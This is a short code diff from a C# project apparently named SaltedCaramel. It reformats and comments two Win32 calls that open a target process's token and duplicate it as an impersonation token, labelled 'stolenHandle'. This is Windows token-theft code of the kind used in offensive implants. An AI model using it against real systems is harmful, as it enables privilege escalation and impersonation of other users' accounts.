@@ -35,7 +35,10 @@ namespace SaltedCaramel
                 try
                 {
                     // Get handle to target process token
-                    bool procToken = Win32.OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out tokenHandle);
+                    bool procToken = Win32.OpenProcessToken(
+                        procHandle.DangerousGetHandle(),            // ProcessHandle
+                        (uint)TokenAccessLevels.MaximumAllowed,     // desiredAccess
+                        out tokenHandle);                           // TokenHandle
 
                     if (!procToken) // Check if OpenProcessToken was successful
                         throw new Exception(Marshal.GetLastWin32Error().ToString());
@@ -45,8 +48,13 @@ namespace SaltedCaramel
                     try
                     {
                         // Duplicate token as stolenHandle
-                        bool duplicateToken = Win32.DuplicateTokenEx(tokenHandle, (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation,
-                            Win32.TOKEN_TYPE.TokenImpersonation, out stolenHandle);
+                        bool duplicateToken = Win32.DuplicateTokenEx(
+                            tokenHandle,                                    // hExistingToken
+                            (uint)TokenAccessLevels.MaximumAllowed,         // dwDesiredAccess
+                            IntPtr.Zero,                                    // lpTokenAttributes
+                            (uint)TokenImpersonationLevel.Impersonation,    // ImpersonationLevel
+                            Win32.TOKEN_TYPE.TokenImpersonation,            // TokenType
+                            out stolenHandle);                              // phNewToken
 
                         if (!duplicateToken) // Check if DuplicateTokenEx was successful
                             throw new Exception(Marshal.GetLastWin32Error().ToString());
